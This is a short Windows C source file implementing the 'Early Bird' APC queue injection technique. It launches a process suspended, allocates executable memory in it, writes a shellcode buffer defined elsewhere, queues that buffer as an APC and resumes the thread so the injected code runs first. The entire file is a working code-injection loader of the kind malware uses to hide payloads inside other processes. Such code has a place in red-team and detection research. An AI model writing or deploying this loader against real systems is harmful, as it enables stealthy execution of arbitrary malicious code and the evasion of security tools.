#include <Windows.h>
#include "AsmCodes.h"

VOID EarlyBirdApcQueueInjection()
{
	unsigned char buf[] = SHELLCODE;
		
	SIZE_T shellSize = sizeof(buf);
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	CreateProcessA("C:\\test\\mimi-katz.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;

	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

	WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);
	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
	ResumeThread(threadHandle);

}